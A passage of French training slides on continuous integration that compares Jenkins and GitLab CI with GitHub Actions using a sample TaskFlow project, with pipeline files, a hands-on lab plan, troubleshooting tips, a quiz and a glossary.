| 2.3 | Quel workflow se déclenche ? | 8 min | `on:`, filtres, `concurrency`, piège des checks requis |
| 2.4 | Lire un log de CI en échec | 10 min | lockfile, service sans port, **matrice** qui révèle un écart de version |

> Rapides : terminez les trois, puis la question 6 du log 3 (« trois corrections, laquelle et pourquoi ? ») à rédiger pour le débrief.

---

<!-- _class: lead -->
# 3.3 Jenkins et GitLab CI

*Mêmes concepts, autres syntaxes*

---

## Jenkins : le vétéran self-hosted

```
 ┌──────────────────────────────────┐   SSH / JNLP    ┌──────────────────┐
 │ CONTROLLER (jenkins/jenkins:lts) │◀───────────────▶│ AGENT linux      │
 │  interface, jobs, plugins        │                 │  executors       │
 │  JENKINS_HOME (état, historique) │                 └──────────────────┘
 │  credentials                     │◀───────────────▶┌──────────────────┐
 └──────────────────────────────────┘                 │ AGENT docker/k8s │
          ▲ webhook (push, PR)                         └──────────────────┘
          │
      GitHub / GitLab / Bitbucket
```

- Depuis 2011 (ex-Hudson), open source, **100 % chez vous** : très présent en entreprise
- ~2 000 **plugins** : force (tout est possible) et faiblesse (mises à jour, compatibilités, failles)
- À **opérer** : sauvegarde de `JENKINS_HOME`, mises à jour, sécurité, agents
- Moderne = **tout en code** : `Jenkinsfile` dans le dépôt, configuration JCasC, plugins listés

---

## Le `Jenkinsfile` déclaratif (extrait de TaskFlow)

```groovy
pipeline {
  agent none
  options { timeout(time: 20, unit: 'MINUTES'); disableConcurrentBuilds(abortPrevious: true) }
  environment { COVERAGE_MIN = '75'; npm_config_cache = '/tmp/.npm' }
  stages {
    stage('api') {
      matrix {
        axes { axis { name 'NODE_VERSION'; values '20', '22' } }
        agent { docker { image "node:${NODE_VERSION}-alpine" } }
        stages { stage('lint + tests') { steps { dir('api') { sh 'npm ci'; sh 'npm run lint'; sh 'npm run test:coverage' } } } }
      }
    }
    stage('intégration et front') {
      parallel {
        stage('api-integration') { agent any; steps { script { /* postgres via docker.image().withRun() */ } } }
        stage('front') {
          agent { docker { image 'node:20-alpine' } }
          steps { dir('front') { sh 'npm ci'; sh 'npm run build' } }
          post { success { archiveArtifacts artifacts: 'front/dist/**' } }
        }
      }
    }
  }
}
```

Séquentiel par défaut, `parallel` explicite ; pas de `services:` ; le déclencheur vit **hors** du fichier.

---

## GitLab CI : la forge intégrée

```
 GitLab (gitlab.com ou auto-hébergé)                     Runners GitLab
 ┌────────────────────────────────────┐   jobs (HTTPS)   ┌───────────────────────┐
 │ dépôt · MR · CI · registre ·       │◀────────────────▶│ executor docker :     │
 │ environnements · sécurité          │                  │ 1 job = 1 conteneur   │
 └────────────────────────────────────┘                  └───────────────────────┘
```

```yaml
stages: [verify, package]
workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
api-integration:
  stage: verify
  image: node:20-alpine
  services: [{ name: postgres:16-alpine, alias: postgres }]
  variables:
    DATABASE_URL: postgres://taskflow:taskflow@postgres:5432/taskflow   # alias, pas localhost
  cache: { key: { files: [api/package-lock.json] }, paths: [.npm/] }
  script: [cd api, npm ci --prefer-offline, npm run test:int]
```

Un seul fichier ; jobs parallèles dans un stage, stages en séquence ; tout est conteneur.

---

## Tableau de correspondance

| Concept | GitHub Actions | Jenkins | GitLab CI |
|---|---|---|---|
| Fichier | `.github/workflows/*.yml` | `Jenkinsfile` | `.gitlab-ci.yml` |
| Exécutant | runner | controller + agents | runner (executor) |
| Déclencheurs | `on:` | config du job / Multibranch | `workflow: rules:` |
| Unité | job → steps | stage → steps | job (dans un stage) → `script` |
| Parallélisme | jobs sans `needs` | `parallel { }` | jobs d'un même stage |
| Environnement | `runs-on` + `setup-node` | `agent { docker { … } }` | `image:` |
| Matrice | `strategy.matrix` | `matrix { axes }` | `parallel: matrix:` |
| Base de test | `services:` | `withRun()` + réseau, à la main | `services:` + `alias` |
| Cache | `cache: npm` | rien d'intégré | `cache: key: files:` |
| Artefact | `upload-artifact` | `archiveArtifacts` | `artifacts:` |
| Annulation | `concurrency` | `disableConcurrentBuilds(abortPrevious)` | `interruptible` + `auto_cancel` |
| Secrets | `secrets.X` | Credentials | variables masquées |
| Approbation | Environment + reviewers | `input` | `when: manual` |

Version complète : `tp/fil-rouge-taskflow/solution/ci-autres-outils/README.md`

---

## Quand choisir quoi ?

| Contexte | Choix raisonnable | Prix à payer |
|---|---|---|
| Code sur GitHub, équipe petite à moyenne | **GitHub Actions** | dépendance à GitHub, minutes en privé |
| Code sur GitLab (souvent auto-hébergé) | **GitLab CI** | opérer GitLab si auto-hébergé |
| Existant Jenkins, réseau fermé, outillage maison | **Jenkins** | équipe pour l'opérer, hygiène des plugins |
| Souveraineté, coût des minutes, accès réseau privé | orchestrateur SaaS + **runners self-hosted** | sécuriser et maintenir les runners |

- Les **concepts** se transfèrent ; la syntaxe s'apprend en une journée
- Ce qui coûte vraiment : **opérer** la plateforme (mises à jour, sauvegarde, sécurité, agents)
- Critère CDA : argumenter avec le contexte (forge, compétences, contraintes réseau, budget), pas avec ses goûts

---

## 🎬 Démo — `demos/demo-jenkins-gitlab/`

```bash
KEEP=1 bash demos/demo-jenkins-gitlab/demo.sh     # Jenkins LTS sur http://localhost:8090
```

1. Jenkins **en code** : `plugins.txt`, `casc.yaml` (pas d'assistant, pas de clics)
2. `01-hello-pipeline` : `stages`, `parallel`, `matrix`, `post`, artefact
3. `02-taskflow-ci` : le `Jenkinsfile` de TaskFlow, chaque stage dans un conteneur `node`, Postgres lancé par le pipeline
4. GitLab : `gitlab/.gitlab-ci.yml` dans le *Pipeline editor* de gitlab.com (*Validate*, *Visualize*) ou exécuté en local (`gitlab-ci-local`)

> Question : qu'est-ce que GitHub fait pour vous… et que Jenkins vous laisse faire ?

---

<!-- _class: lead -->
# 🛠️ TP fil rouge — Étape 1 : la CI de TaskFlow

*13h30-16h45*

---

## Étape 1 : le plan

`tp/fil-rouge-taskflow/etape1-ci.md` — branche `feature/ci`, PR relue par le binôme

| # | Étape | Durée |
|---|---|---|
| 1.0 | Lancer en local ce que la CI lancera (dont `test:int` contre un Postgres jetable) | 10 min |
| 1.1-1.2 | Job `api` (lint, Prettier, tests) puis matrice Node 20/22 | 30 min |
| 1.3 | Job `api-integration` avec service PostgreSQL et healthcheck | 20 min |
| 1.4 | Job `front` + artefact `front-dist` | 15 min |
| 1.5 | Couverture dans `$GITHUB_STEP_SUMMARY` + seuil bloquant | 25 min |
| 1.6 | `concurrency`, `paths-ignore` (au bon endroit), mesure du cache | 15 min |
| 1.7 | Checks requis dans le ruleset ; 2 PR cassées (test rouge, tests supprimés) ; tag `v0.1.0` + release | 30 min |
| 1.8 | `ci-autres-outils/` : `Jenkinsfile` et `.gitlab-ci.yml`, validés | 40 min |

---

## Étape 1 : le contrat (à respecter à la lettre)

| Job (`name:`) | Check(s) | Contenu |
|---|---|---|
| `api` | `api (20)`, `api (22)` | `npm ci`, lint, Prettier, `test:coverage`, seuil `COVERAGE_MIN` |
| `api-integration` | `api-integration` | service `postgres:16-alpine`, `npm run test:int` |
| `front` | `front` | lint, Prettier, tests, build, artefact `front-dist` |
| `docker-build` (bonus) | non requis | build des deux images, `push: false` |

- Déclencheurs : `pull_request` (sans filtre) + `push` sur `main` (avec `paths-ignore`)
- `permissions: contents: read` ; `timeout-minutes` sur chaque job ; `concurrency` sans annulation sur `main`
- Demain, `release.yml` et les déploiements s'appuient sur ce contrat

---

## Étape 1 — Si ça ne marche pas

| Symptôme | Piste |
|---|---|
| Aucun run | chemin `.github/workflows/ci.yml`, extension, fichier poussé sur la branche de la PR |
| `Dependencies lock file is not found` | `cache-dependency-path` depuis la **racine** : `api/package-lock.json` |
| `10 skipped` dans `api-integration` | `DATABASE_URL` mal indenté (doit être sous le job) |
| `ECONNREFUSED 127.0.0.1:5432` | `ports:` manquant sur le service, ou pas de healthcheck |
| Artefact `front-dist` vide | `path: front/dist/` (pas `dist/`) |
| PR bloquée sur *Expected — Waiting for status* | nom de check du ruleset ≠ nom du job (`api` au lieu de `api (20)`), ou filtre `paths` sur `pull_request` |
| Le job reste vert sous le seuil | la comparaison ne fait pas `exit 1` : testez-la en local avec `COVERAGE_MIN=90` |
| Jenkins : `"matrix" … cannot be nested` | sortir la matrice du `parallel` |

---

## Quiz — 5 questions

1. Votre branche, déjà poussée, a été rebasée. Pourquoi `git push` est-il refusé, et pourquoi `--force-with-lease` plutôt que `--force` ?
2. Vous passez TaskFlow de `v1.4.2` à… quelle version, si vous ajoutez un filtre `?done=true` à `GET /api/tasks` ? Et si vous supprimez le champ `done` de la réponse ?
3. Pourquoi le job `api-integration` joint-il la base sur `localhost:5432`, alors qu'un job GitLab utilise `postgres:5432` ?
4. Vous ajoutez `paths-ignore: ["docs/**"]` sous `pull_request`. Une PR ne modifie que `docs/`. Que se passe-t-il ?
5. Les tests passent, mais le job `api` est rouge. Citez deux causes possibles dans votre `ci.yml` d'aujourd'hui.

> 3 minutes, seul, par écrit. Puis on corrige ensemble.

---

## Quiz — Réponses

1. Le rebase a créé de **nouveaux** commits : l'historique distant n'est plus un ancêtre du local (non fast-forward). `--force-with-lease` refuse d'écraser si quelqu'un a poussé entre-temps ; `--force` écrase sans vérifier
2. Filtre compatible = **MINEUR** : `v1.5.0`. Suppression d'un champ = incompatible : **MAJEUR**, `v2.0.0`
3. Nos steps tournent **sur la VM** et le port du service est publié (`ports:`) ; dans GitLab, le job tourne **dans un conteneur** relié au service, joignable par son alias
4. Aucun job ne démarre : les checks **requis** restent *Expected — Waiting for status to be reported*, la PR est **bloquée** indéfiniment
5. Couverture **sous le seuil** (step de couverture, `::error`) ; **lint** ou **Prettier** en échec ; `npm ci` refusé (lockfile désynchronisé) ; `timeout-minutes` dépassé

<!--
Notes formateur : question 5, faire remarquer que « les tests passent » se lit dans le log mais que le check est rouge : toujours ouvrir le step en échec, pas le dernier step lu. Question 4 : c'est le piège n° 1, à relier au choix fait dans ci.yml (filtre sur push uniquement).
-->

---

## Récap du Jour 2

- **Historique** : rebase pour se mettre à jour, rebase interactif (`fixup`, `--exec`) pour la revue ; squash sur `main` ; jamais de réécriture de ce qui est partagé
- **Versions** : SemVer, tag annoté, release GitHub avec notes générées, CHANGELOG
- **CI** : intégrer souvent, build reproductible, tests automatiques, verdict en minutes, `main` jamais rouge
- **GitHub Actions** : jobs parallèles, `services:`, `matrix`, cache par lockfile, `concurrency`, `timeout-minutes`, artefacts, résumé, `permissions` minimales
- **Garde-fous** : checks **requis** (noms exacts, `integration_id`), seuil de couverture, filtres de chemins **seulement** sur `push`
- **Ailleurs** : Jenkins (self-hosted, `Jenkinsfile`, plugins, à opérer) et GitLab CI (stages, services par alias, cache) : mêmes concepts

---

## Glossaire du Jour 2

| Terme | Définition |
|---|---|
| **Rebase** | rejouer ses commits au-dessus d'une autre base ; réécrit les SHA |
| **Rebase interactif** | réécrire une série de commits (`reword`, `fixup`, `drop`, `exec`) |
| **SemVer** | MAJEUR.MINEUR.CORRECTIF : le numéro annonce l'impact du changement |
| **Tag annoté** | étiquette immuable sur un commit, avec auteur, date et message |
| **CI** | intégrer souvent, chaque intégration vérifiée par un build automatisé avec tests |
| **Check requis** | statut qu'une PR doit avoir au vert pour être fusionnée (ruleset) |
| **Service container** | conteneur (Postgres) démarré à côté d'un job, détruit avec lui |
| **Matrice** | un même job répété pour plusieurs valeurs (versions de Node) |
| **Artefact** | fichiers conservés après un run (`front-dist`) |
| **Couverture** | part du code exécutée par les tests ; un seuil bloque la régression |
| **Controller / agent** | Jenkins : le serveur qui orchestre / les machines qui exécutent |
| **Runner / executor** | GitHub, GitLab : la machine (et le mode) qui exécute les jobs |

---

<!-- _class: lead -->
# À demain !

**Jour 3 — Déploiement continu & sécurité du pipeline**

Les images TaskFlow publiées sur ghcr.io, scannées, déployées en **staging** automatiquement puis en **production** après approbation

> Pour demain : `ci.yml` vert sur `main`, ruleset avec checks requis, release `v0.1.0` publiée.
